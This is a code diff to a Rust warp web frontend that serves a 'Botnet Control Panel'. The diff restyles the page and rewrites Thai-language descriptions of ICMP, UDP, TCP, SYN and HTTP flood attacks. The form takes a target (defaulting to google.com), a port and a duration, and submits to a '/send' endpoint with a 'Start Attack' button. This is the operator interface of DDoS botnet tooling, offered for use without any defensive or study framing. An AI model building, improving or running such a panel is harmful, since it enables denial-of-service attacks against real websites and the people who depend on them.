@@ -7,32 +7,58 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
     let index = warp::path::end().map(|| {
         warp::reply::html(r##"
         <html>
-        <head><title>Botnet Control</title></head>
+        <head>
+        <title>Botnet Control</title>
+        <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
+        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #333; }
+        form { display: flex; flex-direction: column; }
+        label { margin-top: 15px; font-weight: bold; }
+        select, input { padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; }
+        button { margin-top: 20px; padding: 10px; background-color: #d9534f; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #c9302c; }
+        .description { font-size: 0.9em; color: #666; margin-top: 5px; }
+        .attack-descriptions { margin-top: 10px; }
+        .attack-descriptions ul { list-style-type: none; padding: 0; }
+        .attack-descriptions li { margin-bottom: 10px; }
+        </style>
+        </head>
         <body>
+        <div class="container">
         <h1>Botnet Control Panel</h1>
         <p>Select attack type, enter target, and duration.</p>
         <form method="post" action="/send">
-        Attack Type: <select name="attack_type">
-        <option value="tcp">TCP Flood</option>
-        <option value="udp">UDP Flood</option>
-        <option value="http">HTTP Flood</option>
-        <option value="syn">SYN Flood</option>
+        <label for="attack_type">Attack Type:</label>
+        <select id="attack_type" name="attack_type">
         <option value="icmp">ICMP Flood</option>
-        </select><br>
-        <p>ประเภทการโจมตี: เทคนิคการทำ DDoS (Distributed Denial of Service)<br>
-        TCP Flood: การส่งแพ็กเก็ต TCP จำนวนมหาศาลไปกวนการเชื่อมต่อ<br>
-        UDP Flood: การส่งแพ็กเก็ต UDP สุ่มพอร์ตไปที่เป้าหมาย เพื่อให้เครื่องเป้าหมายเสียทรัพยากรในการตรวจสอบและตอบกลับ<br>
-        HTTP Flood: การจำลองการส่งคำขอเปิดหน้าเว็บ (GET/POST requests) รัวๆ เพื่อให้ Web Server ทำงานหนักจนล่ม<br>
-        SYN Flood: การส่งแพ็กเก็ตขอเชื่อมต่อ (SYN) ไปรัวๆ แต่ไม่ยอมเชื่อมต่อให้เสร็จ (ไม่ส่ง ACK กลับ) ทำให้ Server รอเก้อจนทรัพยากรหมด (Half-open connections)<br>
-        ICMP Flood: หรือ Ping Flood คือการยิง Ping ไปรัวๆ ให้ Bandwidth เต็ม</p>
-        Target: <input name="target" id="target" value="google.com" size="50" oninput="autoSetPort()"><br>
-        <p>เป้าหมาย: ใส่ชื่อ Domain หรือ IP Address ของเหยื่อ (ในภาพคือ google.com)</p>
-        Port (for TCP/UDP/SYN): <input name="port" id="port" value="80" type="number" min="1" max="65535"><br>
-        <p>ช่องทางที่จะโจมตี (ในภาพใส่ 80 ซึ่งเป็นพอร์ตมาตรฐานของ Web Server HTTP)</p>
-        Duration (seconds): <input name="duration" value="60" type="number" min="1"><br>
-        <p>ระยะเวลาที่จะสั่งให้บอทระดมยิง (ในภาพใส่ 60 วินาที)</p>
-        <input type="submit" value="Start Attack">
+        <option value="udp">UDP Flood</option>
+        <option value="tcp">TCP Flood</option>
+        <option value="syn">SYN Flood</option>
+        <option value="http">HTTP Flood</option>
+        </select>
+        <div class="attack-descriptions">
+        <p><strong>ประเภทการโจมตี:</strong> เทคนิคการ DDoS (Distributed Denial of Service)</p>
+        <ul>
+        <li><strong>ICMP Flood:</strong> หรือ Ping Flood การส่ง ICMP echo requests จำนวนมากเพื่อใช้แบนด์วิดท์จนเต็ม</li>
+        <li><strong>UDP Flood:</strong> การส่งแพ็กเก็ต UDP ไปยังพอร์ตสุ่มเพื่อให้เครื่องเป้าหมายเสียทรัพยากรในการตรวจสอบและตอบกลับ</li>
+        <li><strong>TCP Flood:</strong> การส่งแพ็กเก็ต TCP จำนวนมหาศาลเพื่อรบกวนการเชื่อมต่อและใช้ทรัพยากรของเซิร์ฟเวอร์</li>
+        <li><strong>SYN Flood:</strong> การส่งแพ็กเก็ต SYN ขอเชื่อมต่อแต่ไม่เสร็จสิ้น ทำให้เซิร์ฟเวอร์มี half-open connections จนทรัพยากรหมด</li>
+        <li><strong>HTTP Flood:</strong> การส่งคำขอ HTTP (GET/POST) จำนวนมากเพื่อให้เว็บเซิร์ฟเวอร์ทำงานหนักจนล่ม</li>
+        </ul>
+        </div>
+        <label for="target">Target:</label>
+        <input id="target" name="target" value="google.com" oninput="autoSetPort()">
+        <p class="description">เป้าหมาย: ใส่ชื่อโดเมนหรือที่อยู่ IP ของเป้าหมาย (เช่น google.com)</p>
+        <label for="port">Port (for TCP/UDP/SYN):</label>
+        <input id="port" name="port" value="80" type="number" min="1" max="65535">
+        <p class="description">พอร์ตที่จะโจมตี (เช่น 80 สำหรับ HTTP, 443 สำหรับ HTTPS)</p>
+        <label for="duration">Duration (seconds):</label>
+        <input id="duration" name="duration" value="60" type="number" min="1">
+        <p class="description">ระยะเวลาการโจมตีเป็นวินาที (เช่น 60 วินาที)</p>
+        <button type="submit">Start Attack</button>
         </form>
+        </div>
         <script>
         function autoSetPort() {
             const target = document.getElementById('target').value;
@@ -54,7 +80,6 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
                 portInput.value = 80;
             }
         }
-        // Set initial port
         autoSetPort();
         </script>
         </body>
